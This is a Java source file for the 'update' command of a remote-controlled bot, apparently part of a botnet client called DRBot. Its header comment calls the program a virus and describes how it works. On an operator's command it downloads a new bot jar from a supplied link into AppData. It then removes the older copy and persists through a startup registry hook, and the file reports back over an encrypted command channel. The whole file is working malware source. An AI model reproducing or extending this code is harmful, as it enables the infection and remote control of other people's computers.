package com.DRBot.Commands;

import com.DRBot.SecureLine.SecureLine;
import java.io.PrintWriter;
import java.io.IOException;

/**
 *
 * @author MerNat
 * Just for insuring the steps
 * first this bot will receive a link then it will call down(class sending a ">down [link] [path] [null]"
 *  ----> [link] will be the site that i will distribute 
 *  ----> [path] will be BotName.jar
 *  ----> [null] will be in the /%user%/appdata/local/ in windows 7,8 and 8.1 and 
 *              /appdata/Microsoft/ in windows XP.
 *  ----> And after downloading the Bot, the older Virus must be deleted and cleaned from the PC.
 *  ----> And after clean up the virus. The PC must triggered with the new virus in the next start up.
 *          By hooking it up with a start up registry.
 *      Done.
 */

public class update implements Runnable{
    private String link;
    private final PrintWriter writer;
    private down download;
    private final SecureLine secureLine;
    
    update(String[] command,PrintWriter writer,SecureLine secureLine){
        this.secureLine = secureLine;
        if(command.length==1){
            toPrint("[Update] Synatx Error.");
        }
        else{
            this.link = command[1].replace("*",":");
        }
        this.writer = writer;
    }
    
    @Override
    public void run(){
        
        download = new down(link,writer,secureLine);
        Thread getUpdate = new Thread(download);
        getUpdate.start();
        
        while(getUpdate.isAlive()){
            try {
                Thread.sleep(10*1000);
            } catch (InterruptedException ex) {}
        }
        
        toPrint("[Update] download Complete.");
        Thread killTheBot = new Thread(new killBot(download.getFileOutLocation()));
        killTheBot.start();
    }
    private void toPrint(String toPrint){
        this.writer.println(secureLine.encrypt(toPrint));
        this.writer.flush();
    }
}
